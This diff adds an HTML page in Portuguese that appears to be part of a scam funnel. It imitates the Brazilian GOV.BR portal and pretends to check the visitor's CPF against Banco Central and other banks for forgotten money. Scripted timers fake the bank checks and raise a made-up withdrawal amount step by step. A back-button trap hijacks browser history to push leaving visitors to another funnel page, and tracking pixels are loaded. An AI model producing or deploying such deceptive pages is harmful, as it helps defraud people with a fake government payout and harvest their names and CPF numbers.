@@ -1,0 +1,471 @@
+<!DOCTYPE html><html lang="en"><head>
+    <script src="js/h90ECRFKsAqd.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+<script>
+  window.pixelId = "66d288147745dede27dc2965";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta content="text/html; charset=UTF-8; X-Content-Type-Options=nosniff" http-equiv="Content-Type">
+    <title>Consulta - Video - 2</title>
+
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        'poppins': ['Poppins', 'sans-serif']
+                    }
+                }
+            }
+        }
+    </script>
+
+    <!-- fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+    <!-- REPARO DE QUERY: se a página chegar sem ?utm=..., repõe a query via sessionStorage/referrer (sem recarregar) -->
+    <script>
+    (function(){
+        try {
+            if (!location.search || location.search.length <= 1) {
+                var saved =
+                    (sessionStorage.getItem('utm_final_qs') ||
+                     sessionStorage.getItem('landing_qs') ||
+                     (function(){ try { return new URL(document.referrer).search || '' } catch(e){ return '' } })() ||
+                     ''
+                    ).replace(/^\?/, '');
+                if (saved) {
+                    var cur = new URLSearchParams(location.search);
+                    var add = new URLSearchParams(saved);
+                    add.forEach(function(v,k){ if(!cur.has(k)) cur.set(k,v); });
+                    if (cur.toString()) {
+                        history.replaceState(null, '', location.pathname + '?' + cur.toString() + location.hash);
+                        console.log('[UTM] video: query reparada:', cur.toString());
+                    }
+                }
+            }
+        } catch(e) { console.warn('[UTM] video: falha ao reparar query:', e); }
+    })();
+    </script>
+
+    <style>
+        @keyframes pulse-scale {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        .animate-pulse-scale { 
+            animation: pulse-scale 1s ease-in-out infinite; 
+        }
+        
+        /* Custom Video Player Styles */
+        .video-container {
+            position: relative;
+            width: 100%;
+            max-width: 100%;
+            background: #000;
+            border-radius: 8px;
+            overflow: hidden;
+            cursor: pointer;
+        }
+        
+        .video-container video {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .play-pause-btn {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 70px;
+            height: 70px;
+            background: rgba(255, 255, 255, 0.95);
+            border: none;
+            border-radius: 50%;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+            z-index: 10;
+        }
+
+        .play-pause-btn:hover {
+            transform: translate(-50%, -50%) scale(1.1);
+            background: rgba(255, 255, 255, 1);
+            box-shadow: 0 6px 25px rgba(0, 0, 0, 0.4);
+        }
+
+        .play-pause-btn:active {
+            transform: translate(-50%, -50%) scale(0.95);
+        }
+
+        .play-pause-btn.playing {
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
+
+        .play-pause-btn.show-controls {
+            opacity: 0.9;
+            pointer-events: auto;
+        }
+
+        .play-icon,
+        .pause-icon {
+            width: 30px;
+            height: 30px;
+            fill: #2563eb;
+        }
+
+        .pause-icon {
+            display: none;
+        }
+
+        .play-pause-btn.playing .play-icon {
+            display: none;
+        }
+
+        .play-pause-btn.playing .pause-icon {
+            display: block;
+        }
+    </style>
+</head>
+<body class="w-full overflow-x-hidden font-poppins">
+    <div class="min-h-screen bg-gradient-to-br from-slate-50 via-blue-50 to-indigo-50">
+        <header class="fixed top-0 left-0 right-0 z-50 bg-white/95 backdrop-blur-sm shadow-sm border-b border-gray-200">
+            <div class="px-4 py-2">
+                <div class="flex justify-between items-center">
+                    <div class="flex items-center space-x-3">
+                        <img alt="Logo GOV.BR" class="h-6 w-auto" src="images/YPoRCPhMpNgT.png">
+                        <div class="hidden sm:block h-5 w-px bg-gray-300"></div>
+                        <span class="hidden sm:inline text-xs font-medium text-gray-600">Portal Oficial</span>
+                    </div>
+                    <div class="flex items-center space-x-3">
+                        <div class="flex items-center space-x-1 text-xs text-gray-500">
+                            <svg class="w-3 h-3" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path></svg>
+                            <span class="hidden sm:inline">Seguro</span>
+                        </div>
+                        <button class="flex items-center space-x-2 bg-blue-600 hover:bg-blue-700 text-white px-3 py-1.5 rounded-full transition-colors text-sm">
+                            <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clip-rule="evenodd"></path></svg>
+                            <span class="font-medium" id="nameHeader"></span>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <div class="h-8"></div>
+
+        <main class="px-1 py-4 md:flex md:justify-center md:items-start md:pt-8">
+            <div class="bg-white rounded-lg shadow-sm border border-gray-200 p-4 mx-1 md:max-w-4xl w-full">
+                <div class="text-center mb-6">
+                    <h1 class="text-2xl font-bold text-gray-800 mb-2">Consultando dados de <span id="nameUser2"></span></h1>
+                    <p class="text-gray-600">Aguarde enquanto verificamos suas informações no sistema</p>
+                    <p class="text-sm text-gray-500 mt-1">CPF: <span id="cpfUser"></span></p>
+                </div>
+
+                <div class="mb-4 sm:mb-6">
+                    <div class="relative w-full max-w-xl mx-auto">
+                        <!-- Custom Video Player -->
+                        <div class="video-container">
+                            <video id="video-player" src="media/GzK7HVG9yLWN.mp4" playsinline="" preload="metadata">
+                                Seu navegador não suporta a reprodução de vídeos.
+                            </video>
+                            <button class="play-pause-btn" id="playPauseBtn" aria-label="Play/Pause">
+                                <svg class="play-icon" viewBox="0 0 24 24">
+                                    <path d="M8 5v14l11-7z"></path>
+                                </svg>
+                                <svg class="pause-icon" viewBox="0 0 24 24">
+                                    <path d="M6 4h4v16H6V4zm8 0h4v16h-4V4z"></path>
+                                </svg>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="consulta-section" class="mb-6">
+                    <div class="flex items-center gap-3 mb-4">
+                        <div class="w-6 h-6 border-2 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
+                        <p id="message" class="text-sm font-medium text-gray-800 animate-pulse">Consultando Banco Central...</p>
+                    </div>
+                </div>
+
+                <div class="text-center mb-8">
+                    <h2 class="text-lg text-gray-600 mb-2">Valor encontrado para saque:</h2>
+                    <p class="text-2xl mb-4">
+                        <span class="text-4xl font-bold">
+                            <span id="valueToReceive" class="tabular-nums text-gray-600">Calculando</span>
+                        </span>
+                    </p>
+                </div>
+
+                <div id="progress-section" class="mb-8">
+                    <div class="flex justify-between text-sm text-gray-600 mb-2">
+                        <span>Progresso da consulta</span>
+                        <span id="progressText">0%</span>
+                    </div>
+                    <div class="w-full bg-gray-200 rounded-full h-3">
+                        <div id="progressBar" class="bg-blue-600 h-3 rounded-full transition-all duration-1000 ease-out" style="width: 0%;"></div>
+                    </div>
+                </div>
+
+                <div class="text-center mt-4">
+                    <a href="inicio.html" id="buttonNext" class="relative z-30 hidden px-8 py-4 bg-green-600 hover:bg-green-700 text-white font-bold text-lg rounded-full transition-all duration-500 scale-95 inline-block">
+                        Continuar com o saque
+                    </a>
+
+                    <div class="mt-6 p-4 bg-green-50 border border-green-200 rounded-lg animate-fade-in hidden" id="divNext">
+                        <div class="flex items-center gap-2 mb-2">
+                            <svg fill="currentColor" viewBox="0 0 20 20" class="w-5 h-5 text-green-600">
+                                <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path>
+                            </svg>
+                            <h3 class="font-semibold text-green-800">Consulta finalizada com sucesso!</h3>
+                        </div>
+                        <p class="text-green-700 text-sm">
+                            Encontramos valores disponíveis para saque em seu CPF. Clique no botão acima para prosseguir com o processo.
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <script>
+            // ===== BACK REDIRECT =====
+(function() {
+    const redirectUrl = 'liberacao.html';
+    let redirected = false;
+
+    function buildRedirectUrl() {
+        const queryString = window.location.search;
+        return queryString ? redirectUrl + queryString : redirectUrl;
+    }
+
+    // Substitui o estado atual e empurra um novo em cima
+    history.replaceState({ page: 'trap' }, '', window.location.href);
+    history.pushState({ page: 'current' }, '', window.location.href);
+
+    window.addEventListener('popstate', function(event) {
+        if (!redirected) {
+            redirected = true;
+            window.location.replace(buildRedirectUrl());
+        }
+    });
+
+    window.addEventListener('pageshow', function(event) {
+        if (event.persisted && !redirected) {
+            redirected = true;
+            window.location.replace(buildRedirectUrl());
+        }
+    });
+})();
+// ===== FIM BACK REDIRECT =====
+        // Wait for DOM to be fully loaded
+        document.addEventListener('DOMContentLoaded', () => {
+            // Obter parâmetros da URL (já formatados da página anterior)
+            const urlParams = new URLSearchParams(window.location.search);
+            const nomeUrl = urlParams.get('nome') || '';
+            const cpfUrl = urlParams.get('cpf') || '';
+            
+            // Usar os dados da URL (que já vêm formatados corretamente)
+            // NÃO aplicar nenhuma formatação adicional aqui
+            const nameValue = nomeUrl || localStorage.getItem("name") || "";
+            const cpfValue = cpfUrl || localStorage.getItem('cpf') || '';
+            
+            // Salvar no localStorage para uso posterior (mantendo formato original)
+            if (nomeUrl) localStorage.setItem("name", nomeUrl);
+            if (cpfUrl) localStorage.setItem("cpf", cpfUrl);
+            
+            // Exibir os nomes (sem formatação adicional)
+            const formattedName = nameValue.split(" ")[0];
+            const nameHeader = document.getElementById("nameHeader");
+            const nameUser2 = document.getElementById('nameUser2');
+            
+            if (nameHeader) nameHeader.textContent = formattedName;
+            if (nameUser2) nameUser2.textContent = nameValue;
+
+            const cpfUser = document.getElementById('cpfUser');
+            if (cpfUser) cpfUser.textContent = cpfValue;
+
+            // Custom Video Player
+            const video = document.getElementById('video-player');
+            const playPauseBtn = document.getElementById('playPauseBtn');
+            const videoContainer = document.querySelector('.video-container');
+
+            if (!video || !playPauseBtn || !videoContainer) {
+                console.error('Video elements not found');
+                return;
+            }
+
+            let hasPlayedOnce = false;
+
+            // Handle video errors
+            video.addEventListener('error', function(e) {
+                console.error('Video error:', e);
+                alert('Erro ao carregar o vídeo. Verifique se o arquivo existe em: media/GzK7HVG9yLWN.mp4');
+            });
+
+            // Play/Pause functionality on button click
+            playPauseBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                
+                if (video.paused) {
+                    video.play().catch(function(error) {
+                        console.error('Play error:', error);
+                    });
+                } else {
+                    video.pause();
+                }
+            });
+
+            // Click on video container to toggle controls
+            videoContainer.addEventListener('click', function(e) {
+                // Don't trigger if clicking the button itself
+                if (e.target === playPauseBtn || playPauseBtn.contains(e.target)) {
+                    return;
+                }
+
+                // If video is playing and controls are hidden, show them
+                if (!video.paused && !playPauseBtn.classList.contains('show-controls')) {
+                    playPauseBtn.classList.add('show-controls');
+                    // Hide controls after 2 seconds
+                    setTimeout(function() {
+                        playPauseBtn.classList.remove('show-controls');
+                    }, 2000);
+                }
+            });
+
+            // When video starts playing
+            video.addEventListener('play', function() {
+                hasPlayedOnce = true;
+                playPauseBtn.classList.add('playing');
+                playPauseBtn.classList.remove('show-controls');
+            });
+
+            // When video pauses
+            video.addEventListener('pause', function() {
+                // Always show button when paused
+                playPauseBtn.classList.remove('playing');
+                playPauseBtn.classList.remove('show-controls');
+            });
+
+            // Start the main timer
+            handleTimer();
+        });
+
+        // mensagens animadas
+        const message = document.getElementById('message');
+        setTimeout(() => { if (message) message.textContent = 'Consultando Caixa Econômica...'; }, 10000);
+        setTimeout(() => { if (message) message.textContent = 'Consultando registros bancários antigos...'; }, 20000);
+        setTimeout(() => { if (message) message.textContent = 'Verificando histórico de pendências...'; }, 30000);
+        setTimeout(() => { if (message) message.textContent = 'Cruzando dados CPF X Bacen...'; }, 40000);
+        setTimeout(() => { if (message) message.textContent = 'Analisando contas inativas...'; }, 50000);
+        setTimeout(() => { if (message) message.textContent = 'Verificando valores esquecidos...'; }, 60000);
+        setTimeout(() => { if (message) message.textContent = 'Consultando sistema REGISTRATO...'; }, 70000);
+        setTimeout(() => { if (message) message.textContent = 'Validando documentação...'; }, 80000);
+        setTimeout(() => { if (message) message.textContent = 'Finalizando consulta...'; }, 90000);
+        setTimeout(() => { if (message) message.classList.add('hidden'); }, 100000);
+
+        // valores dinâmicos
+        const valueToReceive = document.getElementById('valueToReceive');
+        setTimeout(() => { 
+            if (valueToReceive) {
+                valueToReceive.textContent = 'R$1.494,00'; 
+                valueToReceive.classList.remove('text-gray-600');
+                valueToReceive.classList.add('text-green-600');
+            }
+        }, 10000);
+        setTimeout(() => { if (valueToReceive) valueToReceive.textContent = 'R$2.094,00'; }, 20000);
+        setTimeout(() => { if (valueToReceive) valueToReceive.textContent = 'R$2.394,00'; }, 30000);
+        setTimeout(() => { if (valueToReceive) valueToReceive.textContent = 'R$3.314,00'; }, 50000);
+        setTimeout(() => { if (valueToReceive) valueToReceive.textContent = 'R$4.514,00'; }, 70000);
+        setTimeout(() => { if (valueToReceive) valueToReceive.textContent = 'R$5.960,00'; }, 90000);
+
+        // barra de progresso
+        const progressBar = document.getElementById('progressBar');
+        const progressText = document.getElementById('progressText');
+        const duration = 105000; // 105s
+        const interval = 1000;
+        const steps = duration / interval;
+        let currentStep = 0;
+        const timer = setInterval(() => {
+            currentStep++;
+            const progressPercent = Math.min((currentStep / steps) * 100, 100);
+            if (progressBar) progressBar.style.width = `${progressPercent}%`;
+            if (progressText) progressText.textContent = `${Math.floor(progressPercent)}%`;
+            if (currentStep >= steps) clearInterval(timer);
+        }, interval);
+
+        // timer principal
+        function handleTimer() {
+            let totalSeconds = 105;
+            const timerElement = document.getElementById('timer');
+            const buttonElement = document.getElementById('buttonNext');
+            const divElement = document.getElementById('divNext');
+
+            const countdown = setInterval(() => {
+                const minutes = Math.floor(totalSeconds / 60);
+                const seconds = totalSeconds % 60;
+                if (timerElement) {
+                    timerElement.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+                }
+                totalSeconds--;
+                if (totalSeconds < 0) {
+                    clearInterval(countdown);
+                    if (timerElement) timerElement.textContent = '00:00';
+                    if (buttonElement) buttonElement.classList.remove('hidden');
+                    if (divElement) divElement.classList.remove('hidden');
+                }
+            }, 1000);
+        }
+
+        // timer auxiliar (permanece igual)
+        let tempoRestante = 45 * 60;
+        function timer2() {
+            const minutos = Math.floor(tempoRestante / 60);
+            const segundos = tempoRestante % 60;
+            const el = document.getElementById('timer2');
+            if (el) el.textContent = `${String(minutos).padStart(2, '0')}:${String(segundos).padStart(2, '0')}`;
+            if (tempoRestante > 0) tempoRestante--;
+            else {
+                clearInterval(intervalo);
+                if (el) el.textContent = '00:00:00';
+            }
+        }
+        const intervalo = setInterval(timer2, 1000);
+    </script>
+
+    <!-- AJUSTE DO LINK "Continuar com o saque" PARA LEVAR OS UTM DA PÁGINA VIDEO -->
+    <script>
+    (function(){
+        try {
+            var a = document.getElementById('buttonNext');
+            if (!a) return;
+            var url = new URL(a.getAttribute('href'), location.href);
+            var cur = new URLSearchParams(location.search);
+            if ([...cur.keys()].length) {
+                var ex = new URLSearchParams(url.search);
+                cur.forEach(function(v,k){ if(!ex.has(k)) ex.set(k,v); });
+                url.search = ex.toString() ? ('?' + ex.toString()) : '';
+                a.setAttribute('href', url.pathname + url.search + url.hash);
+                console.log('[UTM] video: link ajustado ->', a.getAttribute('href'));
+            }
+        } catch(e) { console.warn('[UTM] video: falha ao ajustar link Next:', e); }
+    })();
+    </script>
+
+</body></html>
